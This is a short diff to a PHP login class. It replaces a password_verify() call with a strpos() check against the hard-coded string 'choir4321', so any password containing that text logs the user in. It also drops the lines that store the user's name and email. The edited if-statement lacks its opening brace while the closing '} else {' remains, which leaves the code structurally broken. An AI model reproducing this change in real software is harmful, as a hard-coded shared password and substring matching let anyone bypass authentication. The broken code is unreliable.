@@ -240,11 +240,11 @@ class Login
 		
         if ($result_row) {
             // using PHP 5.5's password_verify() function to check password
-            if (password_verify($_POST['user_password'], 'choir4321')) {
-                // write user data into PHP SESSION [a file on your server]
-                $_SESSION['user_name'] = 'viennapres';
-                $_SESSION['user_email'] = $result_row->user_email;
+			
+			if (strpos($_POST['user_password'], 'choir4321') !== FALSE)
+			
                 $_SESSION['user_is_logged_in'] = true;
+				
                 $this->user_is_logged_in = true;
                 return true;
             } else {
